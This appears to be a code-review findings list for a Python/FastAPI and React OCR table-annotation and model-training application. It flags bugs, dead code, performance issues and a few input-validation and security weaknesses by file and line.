- **`backend/app/adapters/blocks.py:103-104`** (maintainability) — `sqlite3.Connection` used as a context manager only commits/rolls back — it does not close the handle. Every `writing()` scope (which here can stay open for the whole multi-page prefill, i.e. minutes of inference) therefore relies on garbage collection to…
- **`backend/app/adapters/custom_models.py:73`** (maintainability) — `created_at` defaults to `datetime('now')`, i.e. second granularity, so models created in the same second are returned in an arbitrary order and the list/picker order can change between calls. Add a stable tie-breaker (e.g. `, id DESC` — or `rowid`).
- **`backend/app/adapters/inference_config.py:26-27`** (maintainability) — Catching the whole `sqlite3.Error` family silently turns real failures (corrupted file, `database is locked`, permission errors) into an empty config, so callers transparently fall back to env defaults instead of surfacing the problem. Restrict the…
- **`backend/app/adapters/jobs.py:173`** (maintainability) — `settle` and `mark_state` are byte-for-byte the same statement except for which optional column (`exit_code` vs `error`) they carry, and `finish`, `fail`, `stop` and `mark` are four more near-identical `UPDATE jobs SET state=?, ended_at=..., ...` variants.…
- **`backend/app/adapters/models.py:7-8`** (documentation) — The docstring should state the intended semantics for a missing row (no-op vs. error), since the implementation silently succeeds — that is the contract callers must rely on.
- **`backend/app/adapters/models.py:10-12`** (bug) — The `cursor.rowcount` of the UPDATE is never inspected, so a stale/unknown `adapter_id` (e.g. the row was deleted between the caller's `custom_models.get()` check and this call) is reported as success with zero rows changed. Returning a boolean/`rowcount`…
- **`backend/app/adapters/pages.py:14-15`** (maintainability) — `connect()` returns a bare `sqlite3.Connection`, and `with` on such a connection only commits/rolls back — it does **not** close the connection. So every helper here that opens its own connection (this one, `list_for_project`, `sum_failures_inputs`,…
- **`backend/app/adapters/pages.py:225-226`** (maintainability) — `ordered_blocks` sorts by `id`, but every other block accessor in the codebase (`adapters/annotations.py`, `adapters/exports.py`, `adapters/runs.py`) orders by reading order (`COALESCE(order_idx, …), id`). Since the name promises reading order, a future…
- **`backend/app/adapters/rate_limits.py:26`** (maintainability) — The `conn` parameter is never passed by any caller (`services/rate_limit.py` deliberately uses the own-connection path so the counter survives a request rollback), so every `conn is not None` branch is dead. Worse, accepting a caller connection contradicts…
- **`backend/app/adapters/runs.py:46-47`** (bug) — `active_provider` collapses "no active profile" and "the DB could not be read" into the same `None`, and no log is emitted. Downstream (`services/recognition.py:_provider`) this silently changes which provider is recorded on the run, and that value drives…
- **`backend/app/adapters/runs.py:88`** (bug) — Both `check` and `create` assume `page_ids` is non-empty. With an empty list `placeholders` is `""`, producing `... i.page_id IN ()` / `... id IN ()`, which SQLite rejects with `OperationalError: near ")"` rather than the expected empty result, and…
- **`backend/app/adapters/store.py:64-69`** (maintainability) — `put_raw` and `get` share the same key namespace but disagree on encoding: a raw value such as `http://host:8000` or `abc` is not valid JSON, so reading it through `get()` does not fail loudly — it silently returns the default (data loss by design). Today…
- **`backend/app/adapters/system.py:9`** (bug) — `limit` is passed straight into `LIMIT ?` with no validation. SQLite interprets a negative LIMIT as "no limit" (`LIMIT -1`), so any caller that forwards an unvalidated value (e.g. a query parameter) would dump the whole `jobs` table — the opposite of the…
- **`backend/app/adapters/users.py:52-53`** (performance) — `with connect() as conn` does **not** close the connection: `sqlite3.Connection` used as a context manager only commits/rolls back the transaction. Every helper here (`count_active_admins`, `count_users`, `_one`, `_all`, `owned_projects`,…
- **`backend/app/adapters/users.py:82-83`** (bug) — The query normalises the stored column (`lower(email)`) but binds the argument as-is, so a mixed-case lookup silently returns `None`. Today the single caller (`services/users.py:206-207`) lowercases first, which makes the API asymmetric and easy to misuse:…
- **`backend/app/api/auth.py:119-120`** (maintainability) — The `with connect() as conn` block is never used: `conn` is not referenced and `create_session()` opens its own connection (which is what avoids the nested-transaction problem anyway). This only wastes a SQLite connection per login. While fixing it, pass…
- **`backend/app/api/blocks.py:407-408`** (bug) — `points: list[list[float]]` in `BlockUpdate` does not enforce two coordinates per point, so a persisted `[[10]]` (or a flat `[10, 20]`) passes validation and then `p[1]` raises `IndexError` / `float(p[0])` raises `TypeError` here, i.e. a 500 on `/crop`,…
- **`backend/app/api/blocks.py:589-590`** (bug) — `grid["rows"]` / `grid["cols"]` are read with `[]`, and the saved hlines/vlines are indexed at `r1 = r + rowspan` / `c1 = c + colspan` without bounds checks. A persisted grid that is shorter than the cell spans (e.g. written before the current validation,…
- **`backend/app/api/blocks.py:673-674`** (performance) — This is a pure read, yet the (potentially full-page) source-image decode, crop and JPEG encode run inside `annotationstore.writing()`, so the connection and its read transaction stay open for the whole image operation — under WAL that blocks checkpointing…
- **`backend/app/api/datasets.py:0`** (maintainability) — This route has no error translation at all, while `build-paddle` maps `OSError`/`ValueError` to 400 and `build` maps only `ValueError`. Any expected client-side failure raised by `export_formats` (or a filesystem write failure it does not guard) surfaces…
- **`backend/app/api/datasets.py:41-45`** (performance) — Every route already declares `Depends(require_resource(...))`, and `require_resource` resolves `{project_id}` from the path and calls `require_project_access`, which already raises 404 for a non-existent project (except in local auth mode). This helper…
- **`backend/app/api/deps.py:19`** (maintainability) — The `request` parameter is never used in the body — only `params` is read, and the caller already passes `request.path_params`. Dropping it (and updating the call to `_resolve_project(request.path_params)`) avoids a misleading signature and dead parameter.
- **`backend/app/api/deps.py:23-24`** (security) — `_resolve_project` returns on the first matching key. If a route ever carries both `project_id` and `page_id`/`block_id`, the project check wins and the page/block id is never verified to belong to that project, so an accessible project id can mask a…
- **`backend/app/api/evaluate.py:67-68`** (maintainability) — The `try` wraps the whole evaluation (page loading, model inference, table parsing, file writes), so any `ValueError` raised deep inside unrelated code (JSON parsing, PIL, adapters…) is reported as a client-side 400 with its raw message returned to the…
- **`backend/app/api/live.py:105-107`** (maintainability) — A single malformed frame (non-JSON payload raises `json.JSONDecodeError`, a `ValueError` subclass) silently terminates the room: the loop breaks and the client is dropped with a generic close instead of a policy close code, with no log line explaining why.…
- **`backend/app/api/models.py:122`** (bug) — Unlike the sibling SSE endpoints (`api/prelabel.py`, `api/training.py`) this stream is returned without `Cache-Control: no-cache` / `X-Accel-Buffering: no`, so a reverse proxy (nginx) may buffer the events and the download progress will appear frozen.
- **`backend/app/api/page_work.py:25-26`** (maintainability) — `assignee_id`/`reviewer_id` accept any integer (`0`, negatives, huge values) while `expected_version` is constrained with `Field(ge=0)`. The service does validate them against `candidates()` (`work_member_required`), so there is no authorization gap, but…
- **`backend/app/api/page_work.py:37-40`** (bug) — `work_members` is project-scoped but only checks `require_resource()` without `write=True`; that dependency does enforce membership on `project_id` (it resolves the project from the path and calls `require_project_access`), so the listing is not…
- **`backend/app/api/pages.py:15`** (maintainability) — Unused imports: `msg` is never referenced in this module, and neither is `auditsvc` (line 17: `from ..services import audit as auditsvc`) nor `otslmod` (line 14: `from ..domain import otsl as otslmod`). They add startup cost and mislead readers into…
- **`backend/app/api/pages.py:105`** (bug) — `hash()` of the grid string can collide, in which case the cache returns the sums of a *different* table for this block, silently reporting wrong `failed`/`rows`/`cols` counts. Use the JSON string itself (or `hashlib.sha256(...).hexdigest()`) as the key so…
- **`backend/app/api/pages.py:253-255`** (test) — The error message language is hard-coded to Italian here, while every other endpoint in this module honours `Accept-Language` via `parse_lang(request.headers.get("accept-language"))`. Add the `Request` parameter and pass the parsed language so the 409 is…
- **`backend/app/api/pages.py:439-441`** (maintainability) — `importlib.util` is imported but never used anywhere in `_transform_state`; drop it.
- **`backend/app/api/prelabel.py:96-104`** (maintainability) — The whole engine-selection/validation block (enabled check, `_model_client_with_recovery`, `ping`, `OcrEngine().available` check) is duplicated verbatim in `prelabel_stream`. Any change to the availability rules or error payloads must be applied twice, and…
- **`backend/app/api/projects.py:120`** (other) — The first parameter `_conn` is never used (`projectstore.get` opens its own connection), and all call sites pass `None`. Drop the parameter and simplify the call sites, or actually use the connection passed in.
- **`backend/app/api/projects.py:431-433`** (other) — `conn` is never used inside this `with connect() as conn:` block (nor in the analogous blocks in `annotation_queue`, `start_scan` and `import_uploaded_folder`): the store functions open their own connections. The block opens a pointless extra DB connection…
- **`backend/app/api/system.py:74-76`** (maintainability) — The pre-restore backup is created before `name` is validated, so a bogus/traversal name still costs a full SQLite backup (and repeated calls churn the retained backups) before returning 400. Validate the name first (or let `backupsvc.restore` expose a…
- **`backend/app/api/training.py:332`** (maintainability) — This SSE endpoint returns no `Cache-Control: no-cache` / `X-Accel-Buffering: no` headers. Behind a reverse proxy (the usual deployment for this app) responses are buffered, so the client receives the status/log stream only in large chunks or at EOF. Set…
- **`backend/app/api/users.py:134-139`** (bug) — Check-then-act: the ownership check and `delete_user` are not in the same transaction, so a project can be assigned to this user in between. Because `projects.owner_id` is declared `ON DELETE RESTRICT`, that race surfaces as an unhandled…
- **`backend/app/db.py:491`** (maintainability) — Routing migrations to `_execute_additive_migration` via a hardcoded version set is brittle: any future migration that uses `ALTER TABLE ... ADD COLUMN` and is not listed here is executed through `executescript`, and therefore fails with "duplicate column…
- **`backend/app/db.py:500`** (maintainability) — This check treats a database that is *ahead* of the code (e.g. `schema_version = 21` after a downgrade/rollback) exactly like an incomplete chain and reports "manca una migrazione", which is misleading for operators. Separate `current >…
- **`backend/app/db.py:537`** (maintainability) — `with connect() as conn` only commits/rolls back; it does not close the connection. `init_db` can be (and is, in the tests and in any re-initialisation path) invoked multiple times, so each call leaks a handle and its WAL file descriptors until garbage…
- **`backend/app/domain/inference.py:121-123`** (maintainability) — The two branches disagree on the item contract: the `literal_eval` path returns every dict in the list, while the regex fallback keeps only dicts with `bbox` plus `label`/`category`. A response whose list contains an unrelated dict therefore parses…
- **`backend/app/domain/inference.py:209`** (bug) — `list(...)` on a scalar string splits it into characters: a workflow carrying `"languages": "eng"` (e.g. a hand-built dict or an older stored override) produces `["e", "n", "g"]`, which the vendor rejects and, if accepted, would corrupt OCR. Today the…
- **`backend/app/domain/otsl.py:67-68`** (bug) — Cell text is embedded in the token stream verbatim: a text containing a tag-like sequence (`<nl>`, `<fcel>`, or even `<b>`) corrupts the document on the way back — `otsl_to_grid` splits on `<nl>` and terminates `<fcel>` content at the next lowercase tag,…
- **`backend/app/domain/otsl.py:94-97`** (maintainability) — `import re` sits inside the per-row loop (and again inside `looks_like_otsl`), and the regex is recompiled on every iteration. Move the import to module level and precompile the pattern once (e.g. `_TAG_RE = re.compile(r"<([a-z]+)>(.*?)(?=<[a-z]+>|$)",…
- **`backend/app/domain/prefill.py:12`** (maintainability) — `Any` is imported but never referenced in this module; drop the unused import.
- **`backend/app/main.py:79-83`** (maintainability) — This branch is a no-op: `detail` was just assigned `exc.detail` above, so `detail = exc.detail` changes nothing and the `if` condition has no effect on the output. Only the `elif` path matters. Collapse the logic so the intent ("localize only under `/api`…
- **`backend/app/models/base.py:50`** (documentation) — The docstring states "Fields are required and keyword-only: a spec written positionally is unreadable", but `adapter_id` is declared without `field(kw_only=True)`, so `ModelSpec("paddleocr-vl", serve=..., ...)` is still accepted positionally. Either make…
- **`backend/app/models/base.py:53`** (maintainability) — `ModelSpec` is `frozen`, but `labels` wraps a plain mutable `dict`, so the immutability is shallow. `value()`/`declared_values()` hand that very dict object to the legacy registries (`NATIVE_LABELS`, `LIGHTON_LABELS`, `RECIPES`, `_CLOUD_TEMPLATES`), all of…
- **`backend/app/models/base.py:89`** (maintainability) — The `or ""` silently hides an invariant break: the `isinstance(..., NotApplicable)` filter already guarantees `reason()` returns a `str`, so this only converts a genuine empty/missing reason into `""`. Those values are consumed as a *set of adapter ids*…
- **`backend/app/models/llamaindex_ocria.py:8-12`** (maintainability) — `WorkflowField` and `llamaindex_workflow_defaults` are imported but never used in this module: the workflow schema (and therefore the defaults) is entirely produced by `llamaindex_workflow_fields()`. Dead imports mislead readers into thinking this spec…
- **`backend/app/models/paddleocr_vl.py:12-16`** (maintainability) — `PADDLE_WORKFLOW_FIELDS` and `WorkflowField` are imported but never referenced in this module: the settings block only calls `paddle_workflow_fields()` and never spells the `WorkflowField` type. These are dead imports (leftover from the pre-P2 hand-written…
- **`backend/app/services/annotation_schema.py:111`** (bug) — `bool(...)` does not parse persisted flags: the string `"0"`/`"false"`/`"no"` is truthy, so a draft whose `confirmed` was serialised as text (the function is documented to accept "mapping equivalenti", not only SQLite rows) would be exported as confirmed…
- **`backend/app/services/artifacts.py:37`** (bug) — The `hash relpath` line format is fragile and unvalidated: a filename containing a newline (or a leading space, which merges with the two-space separator) produces a line that is misparsed, and a filename consisting only of spaces is silently dropped by…
- **`backend/app/services/auth.py:29`** (maintainability) — `PROJECT_ROLES` is never referenced anywhere in the codebase (only its declaration here), so it is dead code. Either use it to validate the role returned by `get_project_access`/`require_project_access` or remove it.
- **`backend/app/services/auth.py:99-100`** (bug) — `request.client` can legitimately be `None` (ASGI scopes without a client address), so `request.client.host` raises `AttributeError` and turns the login into a 500. Guard the client itself, not just `request`.
- **`backend/app/services/auth.py:150`** (bug) — Session expiry is compared lexicographically on ISO strings. It works only while both sides share the exact format; `datetime.isoformat()` omits microseconds when they are 0, and at the same second `"...+00:00"` sorts *before* `"....123456+00:00"` because…
- **`backend/app/services/auth.py:185-186`** (maintainability) — `get_optional_user` is not referenced by any caller (all routers use `get_current_user`/`resolve_user`), so it is dead code. Note also that, unlike `get_current_user`, it silently skips the `must_change_password` gate: if it is wired up later it becomes a…
- **`backend/app/services/auth.py:199-202`** (performance) — This opens two separate connections/queries (project lookup, then membership lookup) on a helper that runs for nearly every API call through `deps.require_resource`, and the two reads are not atomic. A single LEFT JOIN (`projects p LEFT JOIN…
- **`backend/app/services/auto_training.py:53`** (maintainability) — `_THREADS` is written (start_auto, reconcile_jobs) and popped (finally in `_run`) but never read anywhere in the module, unlike `checkpoint_prepare` which uses it to detect dead threads. It provides no protection and no liveness information, so a job whose…
- **`backend/app/services/backup.py:27-28`** (security) — `reason` is interpolated raw into a filesystem path. Today all callers pass literals (`"manual"`, `"pre-restore"`), but the public signature accepts any string: a value containing `/` or `..` produces a path escaping the component structure and either…
- **`backend/app/services/benchmark.py:37`** (maintainability) — `table_hint_svc` is imported but never used in this module (the hint comes from `evmod._project_table_hint`), so this is a dead import.
- **`backend/app/services/benchmark.py:233`** (performance) — `selectable_pages(project_id)` re-runs `builder.collect_pages_with_blocks(project_id)` even though the very same data was already loaded into `page_data` on the line above. That doubles the (potentially expensive) scan of all pages/blocks for every…
- **`backend/app/services/checkpoint_prepare.py:163-164`** (maintainability) — `_THREADS` is a module-level dict that is only ever written, never pruned: every prepared run leaves a finished `Thread` object referenced for the lifetime of the process, so a long-running dashboard accumulates entries (and their args/plan dicts) without…
- **`backend/app/services/checkpoint_prepare.py:252-253`** (maintainability) — The `run_dir` parameter is immediately shadowed by the `_load` result and never used, so the caller's argument (already computed under `_LOCK`) is silently discarded. Either drop the parameter from the signature/call site or use the passed value and load…
- **`backend/app/services/dataset_builder.py:409`** (maintainability) — `pages` is assigned but never read afterwards (the report uses `total_pages` and `len(page_ids)`); it is dead code that builds a throwaway list of every page dict.
- **`backend/app/services/dataset_builder.py:413-416`** (performance) — `collect_pages_with_blocks` is executed here and then again inside `compute_split(project_id, ...)`, which re-queries all pages/blocks and re-runs `with_cell_provenance` over every table for the same project, only to apply the same gold/pilot/approved…
- **`backend/app/services/dewarp.py:78`** (maintainability) — `strength` is clamped to [0, 2] but is only ever used as a boolean gate (`strength > 0`): 0.1 and 2.0 produce exactly the same result because the value is never forwarded to `monkey_preprocess.preprocess`. This is a misleading API for callers…
- **`backend/app/services/domain_profiles.py:31-35`** (performance) — Every lookup re-globs the profile directory, re-reads and re-parses each JSON file, and `get_profile` does this twice (once inside `canonical_id`, once in its own loop), so a single request performs 2xN disk reads plus JSON parsing. Resolve canonical id…
- **`backend/app/services/evaluate.py:15`** (maintainability) — Unused imports: `re` and `Path` (and `config` at the bottom import block) are never referenced in this module, which suggests code was removed or moved without cleaning the imports up.
- **`backend/app/services/export_formats.py:6`** (maintainability) — `Path` is imported but never referenced in this module (all path building goes through `_project_dir` / `/`). Dead import — remove it.
- **`backend/app/services/export_formats.py:48`** (performance) — `_bbox(points)` is recomputed three times per annotation (each call scans all points twice). Compute it once and reuse it for both `bbox` and `area`.
- **`backend/app/services/hardware.py:218`** (maintainability) — `machine` is only duck-typed (`dict`), but both here and in `plan_local` (`machine["runtimes"]`, `machine["usable_runtimes"]`) the keys are indexed directly. Any caller that hands over a partially built snapshot — a test, a cached payload built by another…
- **`backend/app/services/hardware.py:250`** (bug) — `plan_local` decides runnability only from the declared `local_runtimes`; it never checks that the model actually has a servable MLX checkpoint. `pick_serve_runtime` (same module) additionally requires a non-empty `local_mlx_repo`, so an adapter declaring…
- **`backend/app/services/labeling.py:151`** (bug) — Persisted custom labels are rebuilt without the write-time invariants: `prompt_kind` is not checked against `PROMPT_KINDS` (a stale/invalid kind such as `"layout"` is stored verbatim), `short` is not length-checked, and aliases bypass `_ALIAS_RE` (only…
- **`backend/app/services/local_runtime.py:142-144`** (bug) — `pip install --upgrade pip` writes into `bin_dir()`/`Scripts` and can replace `python.exe` on Windows; more importantly, no `--upgrade-strategy`/`--no-input` is set, so pip can block on an interactive prompt in non-TTY context. Minor, but adding…
- **`backend/app/services/local_runtime.py:148-150`** (maintainability) — The two `subprocess.run` pip calls have no `timeout`, so a stalled network/DNS or a hung resolver blocks the `serve-start-*` worker thread indefinitely: `start()` never returns, `_STARTING_INFO` stays in `preparing_runtime` and the UI shows an install that…
- **`backend/app/services/modal_manager.py:34`** (maintainability) — `connect` is imported but never used in this module (all DB access goes through `jobstore`). Drop the import; note that `time` is also re-imported locally in `_watch` even though it is already imported at module level.
- **`backend/app/services/modal_manager.py:251`** (bug) — The log file handle returned by `log_path.open("a")` is never closed by this process (the child inherits a duplicate, but the parent's descriptor stays open for the lifetime of the backend), so every setup/deploy/stop leaks one fd. Keep the handle in a…
- **`backend/app/services/modal_manager.py:271`** (maintainability) — `is_deploying()`, `current_kind()` (and `extract_endpoint()` with its `URL_PREFIX`/`URL_SUFFIX` constants) have no callers anywhere in the repository — `status()`/`_query_modal_cli()` are the real source of truth now. Dead public API that will drift from…
- **`backend/app/services/model_labels.py:27`** (maintainability) — `UNLIMITED_LABELS` is imported but never used in this module and never imported from here by anyone else (`model_adapters` imports `UNLIMITED2_LABELS`, not this map). It is dead, and unlike the other names on this list it is not a live re-export the…
- **`backend/app/services/model_labels.py:120-123`** (performance) — `NATIVE_LABELS` is derived from immutable specs, so its keys never change, yet every call re-normalizes all of them (up to ~28 entries for MinerU) with a regex. This is called once per parsed block in `prefill.py` and per prediction in `evaluate.py`, so…
- **`backend/app/services/model_settings.py:18-20`** (maintainability) — None of these names imported from `..models.types` is used in this module (`LLAMAINDEX_*`, `PADDLE_*`, `UNLIMITED_*`, `llamaindex_workflow_defaults` never leave the import block), while `WorkflowField`, which is referenced by the annotations of…
- **`backend/app/services/model_surface.py:103-104`** (bug) — `surface_state()` is a public entry point, but for any id that is not in the registry (and does not start with `custom-`) this call raises `ValueError` from `get_adapter`, so the caller gets an exception instead of a `missing` cell — the opposite of the…
- **`backend/app/services/model_surface.py:210`** (maintainability) — `problems_by_model()` has no caller in the codebase: `problems()` (tests), `scripts/surfaces.py --check` and the frontend manifest all use `problems()` / `matrix()` directly, and this helper re-walks the whole matrix (including the per-model…
- **`backend/app/services/native_picker.py:108-109`** (security) — The raw child stderr (tkinter tracebacks with interpreter/library paths, `$DISPLAY` diagnostics, OS details) is propagated verbatim and `api/system.py` embeds it in the 501 response `detail`, exposing internal environment information to the client. Better…
- **`backend/app/services/paddle_dataset.py:97-99`** (performance) — `build` already holds the full `collect_pages_with_blocks(project_id)` result in `data`, but `compute_split` collects it all over again (DB queries plus JSON parsing of every table grid). On big projects the export therefore loads the whole project twice.…
- **`backend/app/services/paddle_dataset.py:194`** (maintainability) — All the manifest warnings are hard-coded Italian strings, while the rest of the dataset pipeline goes through `services.i18n.msg(...)` (see `dataset_builder._write_crop`/`_page_image_path`) and the API routes resolve the request language. Callers on an…
- **`backend/app/services/paddle_official.py:113-115`** (bug) — `hinted` is read straight out of the subprocess stdout (or could be relative to the server's CWD) and is used without checking that it stays inside `root`, the temp dir this call owns. A bug in the runner/`save_to_json`, or a hint that is a relative or…
- **`backend/app/services/paddle_official.py:159-161`** (bug) — The documented fallback ("keep the recursive fallback for older PaddleX schemas") only runs when `parsing_res_list` is *missing*, not when it is present but empty. With `parsing_res_list: []` and detections only in `layout_det_res`, `_items([])` returns…
- **`backend/app/services/page_meta.py:45-46`** (maintainability) — `FileMeta.publication` is parsed but not part of `as_updates()`, so this method is not a faithful "serialize the parsed metadata" helper: any caller that persists its result loses `publication`. Today `scripts/migrate_page_meta.py` works around it by…
- **`backend/app/services/page_meta.py:60`** (bug) — `Path(...).stem` strips only the last suffix, so a name such as `LSI_17186_015.tar.gz` (or `LSI_17186_015.tif.bak`) yields the stem `LSI_17186_015.tar`, which the anchored `_PATTERN` rejects. The function then silently returns an empty `FileMeta()`, so…
- **`backend/app/services/page_work.py:42`** (maintainability) — This 404 bypasses the module's i18n convention: every other error goes through `msg(key, lang)` and the key `page_not_found` already exists in all three locales. Since `get_work` has no `lang` parameter, callers (`api/page_work.py`, `assign`, `submit`)…
- **`backend/app/services/page_work.py:64-65`** (performance) — `BEGIN IMMEDIATE` is taken before this authorization check, so a caller who is not a manager (e.g. any project editor spamming PUT /work) still grabs the RESERVED write lock on every rejected request and serializes all other writers. All validations that…
- **`backend/app/services/pages.py:385`** (bug) — `grid_json` is decoded without any guard, while `_compute_readiness` explicitly wraps the same value in `try/except (TypeError, ValueError)`. A corrupted/legacy `grid_json` therefore makes the confirm/approval flow raise `json.JSONDecodeError` (500)…
- **`backend/app/services/pilot.py:4-5`** (maintainability) — `json` is imported but never used in this module — dead import (likely a leftover from an earlier implementation).
- **`backend/app/services/pipeline.py:62`** (maintainability) — Reading `descriptor.__dict__` bypasses the dataclass API: it silently breaks if the dataclass ever declares `slots=True`, and it couples the public API output to internal attribute layout. Use `dataclasses.asdict()` (already importing from `dataclasses`)…
- **`backend/app/services/prefill.py:10`** (maintainability) — `json` is imported but never used in this module. The same applies to the re-exported helpers imported from `..domain.prefill`: `_iou`, `_containment`, `_box_of`, `_label_of` and `_drop_nested_duplicates` are referenced nowhere in this file and no other…
- **`backend/app/services/prefill.py:424-426`** (maintainability) — Dead bookkeeping: the `tables` counter incremented in this loop is immediately discarded by the recount two lines below (`tables = sum(...)`), as is the `tables = 0` initialisation above. Either drop the increments or keep the promotion counter and add the…
- **`backend/app/services/project_members.py:32`** (bug) — `role` is accepted as a free-form string and written straight to `project_members`, whose CHECK constraint only allows `editor`/`viewer`. A caller that passes anything else (e.g. `owner`, or a typo) triggers an `sqlite3.IntegrityError` that surfaces as a…
- **`backend/app/services/rate_limit.py:16`** (bug) — The window is measured with the wall clock, which is not monotonic: an NTP/manual backward step makes `now - current[0]` negative, so the condition is false and an already expired window is kept alive (legitimate users stay locked out longer), while a…
- **`backend/app/services/recognition.py:193-196`** (bug) — The `"ocr"` fallback in `getattr` can never trigger: `OcrEngine.name` always exists, it is just the empty string when no OCR backend is installed (`available_engine()` returns `None`). So an OCR run started on a machine without RapidOCR/PaddleOCR is…
- **`backend/app/services/recognition.py:443-445`** (bug) — `active_ids` is snapshotted under the lock and then the lock is released before `runstore.reconcile()` queries the DB. Between the two statements another request/thread can insert a `queued` run and register it in `_ACTIVE`; the snapshot will not contain…
- **`backend/app/services/remote_eval.py:17-20`** (bug) — The socket is closed before the SSH tunnel binds the port, so another process can take it in between; `_wait_port` then fails with "SSH tunnel is unavailable" for a reason unrelated to the tunnel. Prefer letting ssh bind port 0 / retry the port allocation…
- **`backend/app/services/remote_eval.py:197-199`** (performance) — This call only validates and discards the result, and `score_validation` calls `validation_samples(run_dir)` again for each target. `validation_samples` re-reads the jsonl files and SHA-256s every image of both splits, so the whole dataset is hashed 3…
- **`backend/app/services/scan.py:79`** (maintainability) — `render_pdf_pages` has no callers in the codebase, and it eagerly materialises every page of the PDF into a list of PIL images — the exact memory pattern the lazy `iter_pdf_pages` was introduced to avoid. If it is not part of a public API/tests, remove it;…
- **`backend/app/services/security.py:31-32`** (bug) — `password.encode("utf-8")` raises `UnicodeEncodeError` for lone-surrogate strings, which a JSON payload such as `"\ud800"` can produce. Login calls this on attacker-controlled input, so a malformed password yields a 500 instead of a 401 (the same issue…
- **`backend/app/services/serve_manager.py:41`** (maintainability) — `connect` is imported but never used in this module (job persistence goes through `jobstore`). Dead import: remove it.
- **`backend/app/services/settings.py:10`** (maintainability) — `import json` is never used in this module (the JSON handling is delegated to `store`). Dead import — remove it.
- **`backend/app/services/table_checks.py:63-67`** (bug) — `str.isdigit()` rejects a leading sign, so a cell such as `-5` (or `−5`/`–5`) returns `None`. `value()` propagates that `None`, the containing sum is counted as failed and `_culprits` reports the cell as unreadable — a false alarm for a table that…
- **`backend/app/services/table_detect.py:809`** (bug) — The caller's `suppress_leaders` flag is honoured by `_column_bounds` but not here: `snap_boundaries` keeps its own default `True`, so `detect_grid(..., suppress_leaders=False)` still suppresses leader dots when computing `row_columns`/`row_columns_proven`,…
- **`backend/app/services/trainer.py:37-38`** (maintainability) — Dead code: `sqlite3` (imported at the top), `connect` (this line) and `RemoteProcess` (imported from `training_executor`) are never referenced in this module, and `_run_paths()` is a private helper with no callers. Remove them to avoid implying a…
- **`backend/app/services/trainer.py:672-673`** (maintainability) — Silently swallowing the exception loses the only signal explaining why merge/registration did not start automatically; the docstring promises the panel will show the reason, but nothing records it. Log the exception (`logger.exception` / `print` is not…
- **`backend/app/services/trainer_metrics.py:91`** (maintainability) — The `n` parameter is never read: the function always returns the last 20000 bytes regardless of the requested number of lines. Callers (`trainer.py`, `checkpoint_prepare.py`, `remote_eval.py`) only use the default, so this is a misleading API — either…
- **`backend/app/services/trainer_script.py:55-56`** (maintainability) — `_FAMILY_PROMPT_KEY` is declared but never referenced anywhere in the codebase (prompt keys are resolved in `training_views.training_prompts`). Dead mapping that will silently drift from the canonical families.
- **`backend/app/services/trainer_script.py:98-99`** (maintainability) — A malformed `report.json` (or a non-directory `snapshot_dir`) is swallowed with `pass`, so training silently falls back to the mutable dataset directory with `snapshot_id=None`: the run is neither pinned nor reproducible and nothing in the log/UI says why.…
- **`backend/app/services/trainer_script.py:492`** (maintainability) — `_llama_factory_script` never reads `run_dir`, `train_file` or `val_file`: the YAML points at `"$RUN_DIR/dataset"` regardless, so these parameters are misleading and easy to drift from the real files written by `prepare_training_files`. It also completely…
- **`backend/app/services/training_executor.py:383-384`** (maintainability) — `import re` is repeated inside `download_artifacts()` and `poll()` although `re` is not imported at module level. Hoisting it to the module imports removes the duplication and keeps the hot `poll()` path free of the import lookup on every iteration.
- **`backend/app/services/unlimited_ocr_mlx_server.py:189`** (performance) — `text_out += result.text` inside the token loop is quadratic string growth (hundreds/thousands of tokens per page: 8192 max_tokens). Accumulate the chunks in a list and `"".join(...)` once after the loop.
- **`backend/app/services/users.py:127-128`** (maintainability) — Unlike `update_user` and `generate_invite`, `set_password` never checks that the user exists: for an unknown `user_id` the adapter's UPDATE simply matches zero rows and the call returns success, so a caller that forgot its own 404 check silently reports a…
- **`backend/pytest.ini:1`** (maintainability) — The configuration enables no strictness or warning controls. With pytest>=9 available (requirements-dev.txt) and a large suite (`backend/tests`), a typo in a marker (e.g. `@pytest.mark.parametrize` misspelled, or an unknown ini key) is silently accepted…
- **`backend/pytest.ini:3`** (maintainability) — `testpaths` silently narrows default collection to `tests/`, which now duplicates the hard-coded target used by `scripts/check.sh` and both CI jobs (`python -m pytest tests -q`). Two independent sources of truth risk drift: if test code is ever added…
- **`backend/tests/conftest.py:17`** (maintainability) — The temporary root is created at import time and never removed, so every test session leaks a `tabularium-tests-*` directory (with a DB and any generated artifacts) into `/tmp`. Consider registering an `atexit`/session-scoped fixture finalizer that removes…
- **`backend/tests/conftest.py:46`** (maintainability) — Unknown constructor arguments are silently swallowed by `*args, **kwargs`. A test passing e.g. `raise_server_exceptions=False` or `backend=...` would be accepted but ignored, and `head()` (and `cookies`/`headers` property setters) are missing, so the tests…
- **`conf/profiles/shipping-registers-1900s.json:20`** (maintainability) — The page-type entries are symmetric in shape here (`description`, `recipe`, `table_format`), but `table_format` mixes types: `"otsl"` for one genre and `null` for the other. Consumers must special-case null instead of reading a single string contract.…
- **`frontend/index.html:7`** (maintainability) — The head declares a light `color-scheme` but ships no `theme-color`, no `description` and no favicon link, so the browser issues a request for `/favicon.ico` on every load (404 noise in logs, and another URL that breaks under a non-root `BASE_PATH`). The…
- **`frontend/index.html:10-11`** (maintainability) — This ~30-line design-rationale block is markup, so it is shipped verbatim to every client in the production HTML rather than living in the repo documentation (the comment itself references `DESIGN.md`). Move the thesis into `DESIGN.md`/the PR description…
- **`frontend/package.json:29`** (maintainability) — `recharts@2.x` is published as deprecated on the registry ("1.x and 2.x branches are no longer active. Bump to Recharts v3 to receive latest features and bugfixes"). React 19 peer support is present in 2.15.4, so there is no ERESOLVE today, but the…
- **`frontend/src/index.css:141-142`** (bug) — Setting the standard `scrollbar-color`/`scrollbar-width` makes Chrome/Edge (121+) ignore the `::-webkit-scrollbar*` rules below, so the intended 10px track, the `--color-fill` groove and the `::-webkit-scrollbar-thumb:hover` affordance never apply in the…
- **`frontend/src/index.css:891-893`** (maintainability) — No code in `frontend/src` ever sets `data-closing`, so `:not([data-closing])` is always true and the guard is dead. Together with the unused `unfold`/`fold` keyframes below (never referenced by any `animation`), this looks like the closing animation of the…
- **`frontend/src/index.css:988-993`** (maintainability) — These two rules can never be observed: in `UniverSheet.tsx` the same callback sets `setReady(true)` and `setSkeletonGone(true)`, so the skeleton is unmounted in the same render that adds `data-ready` — there is no element left to transition, and the…
